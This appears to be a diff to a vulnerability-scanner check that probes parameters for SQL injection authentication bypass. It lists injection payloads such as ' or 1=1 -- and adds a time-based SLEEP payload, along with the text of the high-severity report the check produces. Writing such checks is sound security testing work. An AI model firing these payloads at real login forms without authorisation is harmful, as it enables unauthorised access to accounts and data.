@@ -10,6 +10,7 @@ run for each:
         "' or 1=1 --",
         "' or 1=1 --+",
         "SELECT * FROM users WHERE username = '' OR 1=1-- ' AND password = 'foo'",
+        "SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')",
         "nu11secur1ty' or 1=1#"
         
 
@@ -21,5 +22,6 @@ given query insertion point then
         report issue:
             severity: high
             confidence: certain
-            detail: "Found a vulnerable post parameter that got SQLi bypass authentication vulnerability. The payload nu11secur1ty' or 1=1# was submitted in a POST + GET request. You must test manually to confirm this vulnerability!"
+            detail: "Found a vulnerable post parameter that got SQLi bypass authentication vulnerability.
+                     The payload nu11secur1ty' or 1=1# was submitted in a POST + GET request. You must test manually to confirm this vulnerability!"
     end if
